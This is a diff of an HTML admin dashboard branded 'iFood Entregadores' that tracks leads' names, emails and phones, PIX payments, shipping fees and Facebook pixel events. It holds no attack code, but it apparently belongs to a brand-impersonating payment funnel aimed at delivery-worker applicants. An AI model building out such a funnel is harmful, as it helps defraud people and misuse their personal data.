@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <meta name="theme-color" content="#EA1D2C" />
-  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C" />
+  <meta name="theme-color" content="#111111" />
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#111111" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="default" />
   <title>iFood Entregadores - Admin</title>
@@ -14,32 +14,89 @@
   <link rel="stylesheet" href="style.css?v=3.0" />
 </head>
 <body data-page="admin">
-  <header class="header">
-    <div class="logo-container">
-      <img src="assets/ifoodentregadores.webp" alt="iFood Entregador" class="ifood-logo ifood-logo--wide" />
-    </div>
-  </header>
+  <div class="admin-shell">
+    <aside class="admin-sidebar">
+      <div class="admin-brand">
+        <img src="assets/ifoodentregadores.webp" alt="iFood" />
+        <div>
+          <strong>Dashboard</strong>
+          <span>Entregadores</span>
+        </div>
+      </div>
+      <nav class="admin-nav">
+        <button class="admin-nav-item" data-target="admin-overview">Visao geral</button>
+        <button class="admin-nav-item" data-target="admin-tracking">Tracking</button>
+        <button class="admin-nav-item" data-target="admin-utmfy">UTMfy</button>
+        <button class="admin-nav-item" data-target="admin-leads">Leads</button>
+      </nav>
+      <div class="admin-sidebar-foot">
+        <span class="admin-pill">Seguro</span>
+        <span class="admin-muted">Painel privado</span>
+      </div>
+    </aside>
 
-  <main class="container">
-    <section class="step admin-card" aria-hidden="false">
-      <h1>Painel Administrativo</h1>
-      <p class="admin-muted">Gerencie o pixel, eventos de rastreamento e visualize leads.</p>
+    <main class="admin-main">
+      <header class="admin-topbar">
+        <div>
+          <h1>Painel Administrativo</h1>
+          <p>Analise leads, configure pixels e monitore conversao em tempo real.</p>
+        </div>
+        <div class="admin-topbar-actions">
+          <button id="admin-save" class="btn-primary" type="button">Salvar configuracoes</button>
+          <span id="admin-save-status" class="admin-muted"></span>
+        </div>
+      </header>
 
-      <div id="admin-login" class="admin-login">
+      <section id="admin-login" class="admin-login-card">
         <h2>Acesso restrito</h2>
+        <p class="admin-muted">Digite sua senha para acessar o painel.</p>
         <div class="input-group">
           <input type="password" id="admin-password" class="floating-input" placeholder=" " autocomplete="current-password" />
           <label for="admin-password" class="floating-label">Senha do admin</label>
         </div>
         <button id="admin-login-btn" class="btn-primary" type="button">Entrar</button>
         <div id="admin-login-error" class="form-error hidden"></div>
-      </div>
+      </section>
 
       <div id="admin-panel" class="admin-panel hidden">
-        <div class="admin-section">
+        <section id="admin-overview" class="admin-section">
+          <div class="admin-section-header">
+            <h2>Visao geral</h2>
+            <span id="metric-base" class="admin-chip">Base: 0</span>
+          </div>
+          <div class="admin-metrics">
+            <div class="admin-metric">
+              <span>Leads</span>
+              <strong id="metric-total">0</strong>
+              <em>Total carregado</em>
+            </div>
+            <div class="admin-metric">
+              <span>PIX gerado</span>
+              <strong id="metric-pix">0</strong>
+              <em>Conversao final</em>
+            </div>
+            <div class="admin-metric">
+              <span>Frete selecionado</span>
+              <strong id="metric-frete">0</strong>
+              <em>Etapa checkout</em>
+            </div>
+            <div class="admin-metric">
+              <span>CEP confirmado</span>
+              <strong id="metric-cep">0</strong>
+              <em>Etapa endereco</em>
+            </div>
+            <div class="admin-metric">
+              <span>Ultima atividade</span>
+              <strong id="metric-updated">-</strong>
+              <em>Atualizado</em>
+            </div>
+          </div>
+        </section>
+
+        <section id="admin-tracking" class="admin-section">
           <div class="admin-section-header">
             <h2>Pixel do Facebook</h2>
-            <span class="admin-chip">Rastreamento</span>
+            <span class="admin-chip">Tracking</span>
           </div>
           <div class="admin-grid">
             <label class="admin-switch">
@@ -56,11 +113,11 @@
               <label><input type="checkbox" id="pixel-event-purchase" /> Purchase</label>
             </div>
           </div>
-        </div>
+        </section>
 
-        <div class="admin-section">
+        <section id="admin-utmfy" class="admin-section">
           <div class="admin-section-header">
-            <h2>UTMfy (opcional)</h2>
+            <h2>UTMfy</h2>
             <span class="admin-chip">Webhooks</span>
           </div>
           <div class="admin-grid">
@@ -77,14 +134,9 @@
               <label for="utmfy-api" class="floating-label">Token (opcional)</label>
             </div>
           </div>
-        </div>
+        </section>
 
-        <div class="admin-actions">
-          <button id="admin-save" class="btn-primary" type="button">Salvar configuracoes</button>
-          <span id="admin-save-status" class="admin-muted"></span>
-        </div>
-
-        <div class="admin-section">
+        <section id="admin-leads" class="admin-section">
           <div class="admin-section-header">
             <h2>Leads</h2>
             <span id="leads-count" class="admin-chip">0</span>
@@ -100,6 +152,7 @@
                   <th>Nome</th>
                   <th>Email</th>
                   <th>Telefone</th>
+                  <th>Origem</th>
                   <th>Etapa</th>
                   <th>Status</th>
                   <th>Frete</th>
@@ -111,16 +164,12 @@
             </table>
           </div>
           <button id="leads-more" class="btn-secondary" type="button">Carregar mais</button>
-        </div>
+        </section>
       </div>
-    </section>
-  </main>
+    </main>
+  </div>
 
   <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
-
-  <footer class="footer">
-    <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
-  </footer>
 
   <script src="script.js" defer></script>
 </body>
